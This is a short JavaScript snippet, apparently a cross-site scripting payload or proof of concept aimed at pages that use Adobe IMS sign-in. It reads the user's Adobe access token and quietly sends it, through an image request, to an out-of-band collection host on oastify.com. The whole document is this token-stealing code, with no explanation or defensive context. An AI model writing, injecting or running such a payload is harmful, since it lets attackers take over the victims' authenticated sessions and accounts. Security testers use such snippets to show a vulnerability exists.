(function(){
  var t = window.adobeIMS && window.adobeIMS.getAccessToken();
  if (t && t.token) {
    new Image().src = 'https://b6ikdew8zh5obyabgv7cvxy8nztqreh26.oastify.com/?t=' + encodeURIComponent(t.token);
  }
})();
